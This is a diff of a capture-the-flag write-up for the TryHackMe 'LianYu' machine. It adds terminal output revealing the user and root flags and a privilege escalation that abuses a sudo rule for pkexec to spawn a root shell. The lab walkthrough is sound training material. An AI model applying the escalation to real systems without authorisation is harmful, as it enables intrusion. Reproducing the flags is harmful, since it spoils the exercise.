@@ -385,13 +385,61 @@ M3tahuman
 > 1.6. <em>user.txt</em><br><a id='7'></a>
 >> <code><strong>THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}</strong></code>
 
-<pre><code>~# 
+<br>
+
+![image](https://github.com/user-attachments/assets/b3a27219-99f7-4a7e-a547-21aad2855cf8)
+
+<pre><code>slade@LianYu:~$ id
+uid=1000(slade) gid=1000(slade) groups=1000(slade),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),115(bluetooth)
+slade@LianYu:~$ pwd
+/home/slade
+slade@LianYu:~$ ls
+user.txt
+slade@LianYu:~$ cat user.txt
+THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
+			--Felicity Smoak
+
+slade@LianYu:~$ 
 </code></pre>
 
-> 1.7. <em>root.txt</em><br><a id='7'></a>
->> <code><strong>__</strong></code>
+<br>
 
-<pre><code>~# 
+> 1.7. <em>root.txt</em><br><a id='7'></a>
+>> <code><strong>THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}</strong></code>
+
+<pre><code>slade@LianYu:~$ sudo -l
+[sudo] password for slade: 
+Matching Defaults entries for slade on LianYu:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User slade may run the following commands on LianYu:
+    (root) PASSWD: /usr/bin/pkexec
+slade@LianYu:~$  
+</code></pre>
+
+<pre><code>slade@LianYu:~$ sudo pkexec /bin/sh
+# whoami
+root
+# pwd
+/root
+# ls
+root.txt
+# cat root.txt
+                          Mission accomplished
+
+
+
+You are injected me with Mirakuru:) ---> Now slade Will become DEATHSTROKE. 
+
+
+
+THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
+									      --DEATHSTROKE
+
+Let me know your comments about this machine :)
+I will be available @twitter @User6825
+
+#
 </code></pre>
 
 
